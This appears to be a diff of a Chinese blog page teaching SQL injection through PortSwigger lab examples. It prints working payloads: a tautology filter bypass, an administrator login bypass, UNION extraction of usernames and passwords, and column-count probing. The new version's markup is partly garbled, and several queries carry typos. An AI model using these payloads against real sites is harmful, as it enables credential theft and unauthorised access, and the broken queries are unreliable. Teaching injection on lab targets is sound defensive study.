           <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>在本篇随笔当中将会介绍什么是SQL注入，如何查找和利用SQL注入及如何防止SQL注入</p>
 <p><img src="/2021/04/13/2021-04-13/1.jpg"></p>
-<h1 id="0x02-SQL注入"><a href="#0x02-SQL注入" class="headerlink" title="0x02 SQL注入"></a>0x02 SQL注入</h1><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a><strong>原理</strong>：</h4><p>客户端提交的表单数据被拼接到数据库的查询语句当中,被当作SQL语句的一部分执行。</p>
+<h1 id="0x02-SQL注入"><a href="#0x02-SQL注入" class="headerlink" title="0x02 SQL注入"></a>0x02 SQL注入</h1><h2 id="1-原理："><a href="#1-原理：" class="headerlink" title="1. 原理："></a>1. 原理：</h2><p>客户端提交的表单数据被拼接到数据库的查询语句当中,被当作SQL语句的一部分执行。</p>
 <p>SQL injection is a web security vulnerability that allows an attacker to  interfere with queries that an application  makes to its databases.It generally allows an attacker to view  data that not normally able to retrive.</p>
-<h4 id="危害："><a href="#危害：" class="headerlink" title="危害："></a><strong>危害</strong>：</h4><p>数据库信息泄漏、网页篡改、服务器被远程控制，被安装后门、网站被挂马，传播恶意软件(修改数据库一些字段的值，嵌入网马链接，进行挂马攻击)、数据库被恶意操作(数据库服务器被攻击，数据库的系统管理员帐户被窜改)、破坏硬盘数据，瘫痪全系统。</p>
-<h4 id="基本流程："><a href="#基本流程：" class="headerlink" title="基本流程："></a>基本流程：</h4><ol>
-<li>判断是否有注入点</li>
-<li>获取数据库基本信息</li>
-<li>获取数据库库名</li>
-<li>获取数据库表名</li>
-<li>获取数据库列名</li>
-<li>获取用户信息</li>
-<li>破解数据</li>
-<li>提升权限</li>
-<li>内网渗透</li>
-</ol>
-<p>数据库分关系型数据库和非关系型数据库。</p>
-<p><strong>关系型数据库</strong>：</p>
-<p>主要代表：Mysql、SQL Server、Oracle、PostgreSQL。</p>
-<p><strong>1.概念</strong></p>
-<p>关系型数据库是指采用了二维表格模型这种关系模型来组织数据的数据库。支持联表查询、使用正则表达式查询、嵌套查询，还可写独立的SQL脚本</p>
-<p><strong>2.优点</strong></p>
-<p>（1）容易理解，二维表的结构非常贴近现实世界，二维表格，容易理解。</p>
-<p>（2）使用方便，通用的sql语句使得操作关系型数据库非常方便。</p>
-<p>（3）易于维护，数据库的ACID属性，大大降低了数据冗余和数据不一致的概率。</p>
-<p><strong>3.瓶颈</strong></p>
-<p>(1 )海量数据的硬盘I/O读写效率。</p>
-<p>(2) 高扩展性和可用性。难以横向拓展的，数据库没有办法像web Server那样简单的通过添加更多的硬件和服务节点来拓展性能和负载能力。</p>
-<p><strong>非关系型数据库</strong></p>
-<p><strong>1.概念</strong></p>
-<p>主要代表MongoDB，Redis、CouchDB。</p>
-<p>NoSQL非关系型数据库，主要指那些非关系型的、分布式的，且一般不保证ACID的数据存储系统。NoSQL以键值来存储，且结构不稳定，每个元组字段不同，不局限于固定结构，可以减少时间和空间开销。获取用户的不同信息时，仅需要根据key来取出对应的value值即可。</p>
-<p><strong>2.分类</strong></p>
-<p>非关系数据库大部分是开源的，实现比较简单，大都是针对一些特性的应用需求出现的。根据结构化方法和应用场景的不同，分为以下几类。</p>
-<p>（1）面向高性能并发读写的key-value数据库</p>
-<p>主要特点是具有极高的并发读写性能，例如Redis、Tokyo Cabint等。</p>
-<p>（2）面向海量数据访问的面向文档数据库</p>
-<p>特点是，可以在海量的数据库快速的查询数据。例如MongoDB以及CouchDB.</p>
-<p>（3）面向可拓展的分布式数据库</p>
-<p>解决的主要问题是传统数据库的扩展性上的缺陷。</p>
-<p><strong>3.缺点</strong></p>
-<p>不能像sql提供where字段的查询。适合存储较为简单的数据。有一些不能持久化数据，需要和关系型数据库结合。</p>
-<p>本文主要面对mysql，众所周知,mysql针对不同的存储需求，会去选择最优的存储引擎。存储引擎就是存储数据、建立索引、更新查询数据等的实现方式。好像扯多了。来看看与sqli相关的系统函数</p>
-<h2 id="1-常见函数："><a href="#1-常见函数：" class="headerlink" title="1. 常见函数："></a>1. 常见函数：</h2><ol>
-<li><p>version() MySQL 版本 select version()</p>
+<h2 id="2-危害："><a href="#2-危害：" class="headerlink" title="2. 危害："></a>2. 危害：</h2><p>数据库信息泄漏、网页篡改、服务器被远程控制，被安装后门、网站被挂马，传播恶意软件(修改数据库一些字段的值，嵌入网马链接，进行挂马攻击)、数据库被恶意操作(数据库服务器被攻击，数据库的系统管理员帐户被窜改)、破坏硬盘数据，瘫痪全系统。</p>
+<h2 id="3-相关-可跳过"><a href="#3-相关-可跳过" class="headerlink" title="3.相关(可跳过)"></a>3.相关(可跳过)</h2><h3 id="a-数据库分类："><a href="#a-数据库分类：" class="headerlink" title="a.数据库分类："></a>a.数据库分类：</h3><p>数据库分关系型数据库和非关系型数据库。</p>
+<p><strong>关系型数据库</strong>：主要代表：Mysql、SQL Server、Oracle、PostgreSQL。关系型数据库是指采用了二维表格模型这种关系模型来组织数据的数据库。支持联表查询、使用正则表达式查询、嵌套查询，还可写独立的SQL脚本</p>
+<p><strong>非关系型数据库</strong>：主要代表MongoDB，Redis、CouchDB。NoSQL非关系型数据库，主要指那些非关系型的、分布式的，且一般不保证ACID的数据存储系统。NoSQL以键值来存储，且结构不稳定，每个元组字段不同，不局限于固定结构，可以减少时间和空间开销。获取用户的不同信息时，仅需要根据key来取出对应的value值即可。</p>
+<p>其中，</p>
+<ul>
+<li><p>PHP搭建的Web应用后端为MySQL</p>
 </li>
-<li><p>user() 数据库用户名</p>
+<li><p>JSP搭建的Web应用后端为Oracle</p>
 </li>
-<li><p>database() 数据库名 select databases;</p>
+<li><p>ASP搭建的Web应用后端为MSSQL</p>
 </li>
-<li><p>@@datadir 返回数据库的存储目录 select @@datadir;</p>
-</li>
-<li><p>@@version_compile_os 操作系统版本 select @@version_compile_os;</p>
-</li>
-<li><p>SQL 注释语句 (“–”与”/<em>…</em>/“)</p>
-<p>(1)–表示单行注释</p>
-<p>(2)/*…*/用于多行(块)注释</p>
-</li>
-<li><p>concat(str1,str2,…) 没有分隔符地连接字符串，如有任何一个参数为NULL ，则返回值为 NULL</p>
-</li>
-<li><p>concat_ws(separator,str1,str2,…) 含有分隔符地连接字符串</p>
-</li>
-<li><p>group_concat(str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每条数据</p>
-</li>
-<li><p>mid();  substr(); substring()-从一个字符串中截取指定数量的字符</p>
-</li>
-<li><p>limit()  从某个值开始，取出之后的N条数据的语法 (返回结果中的前几条数据或者中间的数据) select * from 表名 limit M,N;m是:指从m位开始(第一位为0)         n是:指取n条</p>
-</li>
-<li><p>order by 默认按照升序对记录进行排序， ORDER BY Company (DESC)</p>
-</li>
-<li><p>group by 结合合计函数，根据一个或多个列对结果集进行分组</p>
-</li>
-<li><p>sleep() select sleep(N)可以让此语句运行N秒钟</p>
-</li>
-<li><p>if() 语法：IF(expr1,expr2,expr3) 其中，expr1是判断条件，expr2和expr3是符合expr1的自定义的返回结果。</p>
-</li>
-<li><p>left() LEFT(str,len) 返回最左边的n个字符的字符串str，或NULL如果任何参数是NULL</p>
-</li>
-<li><p>count() COUNT(column_name) 语法 COUNT(column_name) 函数返回指定列的值的数目(NULL 不计入)</p>
-</li>
-<li><p>round()  四舍五入一个正数或者负数，结果为一定长度的值</p>
-</li>
-<li><p>hex() 16进制编码 select hex(‘dvwa’)  //编码         select unhex(‘64767761’)  //解码         </p>
-<p>select 0x64767761  //16进制解码</p>
-</li>
-<li><p>ascii(arg)/ord（arg） ：返回目标字符对应的ASCII码，注意：arg为单个字符。     语句：select ascii(‘a’)  </p>
-</li>
-<li><p>char(arg)：返回ASCII码只对应的字符     语句：select char（97）</p>
-</li>
-<li><p>hex()：将目标字符串装换成16进制格式的数据     语句： select hex(“dvwa”)</p>
-</li>
-<li><p>unhex()：将16进制格式的数据装换成原字符串</p>
-<pre><code>语句：unhex(64767761) 
+</ul>
+<h3 id="b-常见函数："><a href="#b-常见函数：" class="headerlink" title="b.  常见函数："></a>b.  常见函数：</h3><ol>
+<li><pre><code>1. version() MySQL 版本 select version()
+
+2. user() 数据库用户名
+
+3. database() 数据库名 select databases;
+
+4. @@datadir 返回数据库的存储目录 select @@datadir;
+
+5. @@version_compile_os 操作系统版本 select @@version_compile_os;
+
+6. SQL 注释语句 (&quot;--&quot;与&quot;/*...*/&quot;)
+
+   (1)#
+   (2)--       表示单行注释
+   (3) /*comment*/    用于多行(块)注释 
+   (4)/*! MYSQL Special SQL */
+    
+
+7. concat(str1,str2,...) 没有分隔符地连接字符串，如有任何一个参数为NULL ，则返回值为 NULL
+
+8. concat_ws(separator,str1,str2,...) 含有分隔符地连接字符串
+
+9. group_concat(str1,str2,...) 连接一个组的所有字符串，并以逗号分隔每条数据
+
+10. mid();  substr(); substring()-从一个字符串中截取指定数量的字符
+
+11. limit()  从某个值开始，取出之后的N条数据的语法 (返回结果中的前几条数据或者中间的数据) select * from 表名 limit M,N;m是:指从m位开始(第一位为0)         n是:指取n条
+
+12. order by 默认按照升序对记录进行排序， ORDER BY Company (DESC)
+
+13. group by 结合合计函数，根据一个或多个列对结果集进行分组
+
+14. sleep() select sleep(N)可以让此语句运行N秒钟
+
+15. if() 语法：IF(expr1,expr2,expr3) 其中，expr1是判断条件，expr2和expr3是符合expr1的自定义的返回结果。
+
+16. left() LEFT(str,len) 返回最左边的n个字符的字符串str，或NULL如果任何参数是NULL
+
+17. count() COUNT(column_name) 语法 COUNT(column_name) 函数返回指定列的值的数目(NULL 不计入)
+
+18. round()  四舍五入一个正数或者负数，结果为一定长度的值
+
+19. hex() 16进制编码 select hex(&#39;dvwa&#39;)  //编码         select unhex(&#39;64767761&#39;)  //解码         
+
+    select 0x64767761  //16进制解码
+
+20. ascii(arg)/ord（arg） ：返回目标字符对应的ASCII码，注意：arg为单个字符。     语句：select ascii(‘a’)  
+
+21. char(arg)：返回ASCII码只对应的字符     语句：select char（97）
+
+22. hex()：将目标字符串装换成16进制格式的数据     语句： select hex(“dvwa”)
+
+23. unhex()：将16进制格式的数据装换成原字符串
+        语句：unhex(64767761) 
+
+24. load_file()读取文件
+
+25. floor()返回小于或等于X的最大整数
+
+26. strcmp() 比较两个字符串ascii值的大小（大小写不敏感）
+
+27. exp()返回e的X次方
+28.  Mysql可以使用的空白字符：
+    %09
+    %0a
+    %0b
+    %0c
+    %0d
+    %20
+    %a0
+    /**/
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### c. 常用语句：</span><br><span class="line"></span><br><span class="line">- 查库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+select schema_name from imformation_schema.schemata;
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 查表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+select schema_table from information_schema.tables where schema_name=&#39;security&#39;;
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 查字段</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+select colunm_name from information_schema.colunms where table_name=users and table_schema=&#39;security&#39;;
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 查数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+select * from security.users;
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">## 4. 基本流程：</span><br><span class="line"></span><br><span class="line">1. 判断是否有注入点</span><br><span class="line">2. 获取数据库基本信息</span><br><span class="line">3. 获取数据库库名</span><br><span class="line">4. 获取数据库表名</span><br><span class="line">5. 获取数据库列名</span><br><span class="line">6. 获取用户信息</span><br><span class="line">7. 破解数据</span><br><span class="line">8. 提升权限</span><br><span class="line">9. 内网渗透</span><br><span class="line"></span><br><span class="line">## 5. 注入分类</span><br><span class="line"></span><br><span class="line">数字型注入:注入的参数为整数</span><br><span class="line"></span><br><span class="line">字符型注入：注入的参数为字符&#x2F;串</span><br><span class="line"></span><br><span class="line">POST注入：注入字段在POST数据中</span><br><span class="line"></span><br><span class="line">Cookie注入：注入字段在Cookie数据中</span><br><span class="line"></span><br><span class="line">延迟注入：使用数据库延迟特性进行注入</span><br><span class="line"></span><br><span class="line">搜索注入：在搜索栏中利用恶意代码进行注入</span><br><span class="line"></span><br><span class="line">base64注入：注入字符串经过base64加密</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 3. 注入分类：</span><br><span class="line"></span><br><span class="line">联合查询（union）注入、布尔盲注(base on boolian)、时间盲注(base on time)、报错信息注入、宽字节注入、偏移注入等。</span><br><span class="line"></span><br><span class="line">### 1.Retrieving hidden data</span><br><span class="line"></span><br><span class="line">[where子句的SQLi允许查询隐藏数据](https:&#x2F;&#x2F;ac991fcc1e603304800c031d001b00e5.web-security-academy.net&#x2F;filter?category&#x3D;Gifts)</span><br><span class="line"></span><br><span class="line">* 测试是否存在注入：&#39;   &#39;&#39;，内部服务器错误，存在sql注入。</span><br><span class="line"></span><br><span class="line">![](2.jpg)</span><br><span class="line"></span><br><span class="line">* 数据库正常查询语句：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+SELECT * FROM products WHERE category = &#39;pets&#39; AND release = 1
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 加单&#x2F;双引号测试注入:内部服务器报错</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+SELECT * FROM products WHERE category = &#39;&#39;&#39; AND release = 1
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 加双连接符注释掉后面内容：无category为空的内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+SELECT * FROM products WHERE category = &#39;&#39;--&#39; AND release = 1
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 加入真命题，返回全部内容，包含发布与未发布的。release&#x3D;1代表已发布的。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+SELECT * FROM products WHERE category = &#39;&#39; or 1=1 --&#39; AND release = 1
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 2.Subverting application logic</span><br><span class="line"></span><br><span class="line">[登陆绕过](https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;sql-injection&#x2F;lab-login-bypass)</span><br><span class="line"></span><br><span class="line">![](5.jpg)</span><br><span class="line"></span><br><span class="line">与上面相同，这里不再过多赘述</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+正常查询语句：
+SELECT firstname FROM users WHERE  username = &#39;administrator&#39; AND password = &#39;admin&#39;
+测试：
+SELECT firstname FROM users WHERE  username = &#39;&#39;&#39; AND password = &#39;admin&#39;
+注释后成功注入：
+SELECT firstname FROM users WHERE  username = &#39;administrator&#39;-- AND password = &#39;admin&#39;
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 3.UNION attacks, where you can retrieve data from different database tables.</span><br><span class="line"></span><br><span class="line">从数据库表中检索数据：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+正常查询：
+SELECT name,description FROM products WHERE category = &#39;GIFTS&#39;
+查询其他数据：
+SELECT name,description FROM products WHERE category = &#39;&#39;UNION SELECT username, password FROM users--
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">union对原始查询结果追加多个额外的&#96;SELECT&#96;查询。必须满足：</span><br><span class="line"></span><br><span class="line">* 各个查询列数量相同。</span><br><span class="line">* 每个列中的数据类型相同。</span><br><span class="line"></span><br><span class="line">要进行union注入的前提是，知道原始查询返回的列数、原始查询中返回的哪些列的数据类型比较适合保存注入的结果。</span><br><span class="line"></span><br><span class="line">首先需要确定列数：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+&#39; ORDER BY 1--
+&#39; ORDER BY 2--
+&#39; ORDER BY 3--
+etc.
+//NULL可以转换为每种常用的数据类型
+&#39; UNION SELECT NULL--
+&#39; UNION SELECT NULL,NULL--
+&#39; UNION SELECT NULL,NULL,NULL--
+etc.
 </code></pre>
 </li>
-<li><p>load_file()读取文件</p>
-</li>
-<li><p>floor()返回小于或等于X的最大整数</p>
-</li>
-<li><p>strcmp() 比较两个字符串ascii值的大小（大小写不敏感）</p>
-</li>
-<li><p>exp()返回e的X次方</p>
-</li>
 </ol>
-<h2 id="2-常用语句："><a href="#2-常用语句：" class="headerlink" title="2. 常用语句："></a>2. 常用语句：</h2><ul>
-<li>查库</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from imformation_schema.schemata;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查表</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select schema_table from information_schema.tables where schema_name&#x3D;&#39;security&#39;;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查字段</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select colunm_name from information_schema.colunms where table_name&#x3D;users and table_schema&#x3D;&#39;security&#39;;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查数据</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from security.users;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="3-注入分类："><a href="#3-注入分类：" class="headerlink" title="3. 注入分类："></a>3. 注入分类：</h2><p>联合查询（union）注入、布尔盲注(base on boolian)、时间盲注(base on time)、报错信息注入、宽字节注入、偏移注入等。</p>
-<h3 id="1-Retrieving-hidden-data"><a href="#1-Retrieving-hidden-data" class="headerlink" title="1.Retrieving hidden data"></a>1.Retrieving hidden data</h3><p><a target="_blank" rel="noopener" href="https://ac991fcc1e603304800c031d001b00e5.web-security-academy.net/filter?category=Gifts">where子句的SQLi允许查询隐藏数据</a></p>
-<ul>
-<li>测试是否存在注入：’   ‘’，内部服务器错误，存在sql注入。</li>
-</ul>
-<p><img src="/2021/04/13/2021-04-13/2.jpg"></p>
-<ul>
-<li>数据库正常查询语句：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;pets&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>加单/双引号测试注入:内部服务器报错</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;&#39;&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>加双连接符注释掉后面内容：无category为空的内容</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;&#39;--&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>加入真命题，返回全部内容，包含发布与未发布的。release=1代表已发布的。</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;&#39; or 1&#x3D;1 --&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-Subverting-application-logic"><a href="#2-Subverting-application-logic" class="headerlink" title="2.Subverting application logic"></a>2.Subverting application logic</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/lab-login-bypass">登陆绕过</a></p>
-<p><img src="/2021/04/13/2021-04-13/5.jpg"></p>
-<p>与上面相同，这里不再过多赘述</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">正常查询语句：</span><br><span class="line">SELECT firstname FROM users WHERE  username &#x3D; &#39;administrator&#39; AND password &#x3D; &#39;admin&#39;</span><br><span class="line">测试：</span><br><span class="line">SELECT firstname FROM users WHERE  username &#x3D; &#39;&#39;&#39; AND password &#x3D; &#39;admin&#39;</span><br><span class="line">注释后成功注入：</span><br><span class="line">SELECT firstname FROM users WHERE  username &#x3D; &#39;administrator&#39;-- AND password &#x3D; &#39;admin&#39;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="3-UNION-attacks-where-you-can-retrieve-data-from-different-database-tables"><a href="#3-UNION-attacks-where-you-can-retrieve-data-from-different-database-tables" class="headerlink" title="3.UNION attacks, where you can retrieve data from different database tables."></a>3.UNION attacks, where you can retrieve data from different database tables.</h3><p>从数据库表中检索数据：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">正常查询：</span><br><span class="line">SELECT name,description FROM products WHERE category &#x3D; &#39;GIFTS&#39;</span><br><span class="line">查询其他数据：</span><br><span class="line">SELECT name,description FROM products WHERE category &#x3D; &#39;&#39;UNION SELECT username, password FROM users--</span><br></pre></td></tr></table></figure>
-
-<p>union对原始查询结果追加多个额外的<code>SELECT</code>查询。必须满足：</p>
-<ul>
-<li>各个查询列数量相同。</li>
-<li>每个列中的数据类型相同。</li>
-</ul>
-<p>要进行union注入的前提是，知道原始查询返回的列数、原始查询中返回的哪些列的数据类型比较适合保存注入的结果。</p>
-<p>首先需要确定列数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#39; ORDER BY 1--</span><br><span class="line">&#39; ORDER BY 2--</span><br><span class="line">&#39; ORDER BY 3--</span><br><span class="line">etc.</span><br><span class="line">&#x2F;&#x2F;NULL可以转换为每种常用的数据类型</span><br><span class="line">&#39; UNION SELECT NULL--</span><br><span class="line">&#39; UNION SELECT NULL,NULL--</span><br><span class="line">&#39; UNION SELECT NULL,NULL,NULL--</span><br><span class="line">etc.</span><br></pre></td></tr></table></figure>
-
-
-
 <h3 id="4-Examining-the-database-where-you-can-extract-information-about-the-version-and-structure-of-the-database"><a href="#4-Examining-the-database-where-you-can-extract-information-about-the-version-and-structure-of-the-database" class="headerlink" title="4.Examining the database, where you can extract information about the version and structure of the database."></a>4.Examining the database, where you can extract information about the version and structure of the database.</h3><h3 id="5-Blind-SQL-injection"><a href="#5-Blind-SQL-injection" class="headerlink" title="5.Blind SQL injection"></a>5.Blind SQL injection</h3><h1 id="0x03-SQLMAP源码分析"><a href="#0x03-SQLMAP源码分析" class="headerlink" title="0x03 SQLMAP源码分析"></a>0x03 SQLMAP源码分析</h1>
       
     </div>
@@ -1240,7 +1547,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1249,7 +1556,7 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">19</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
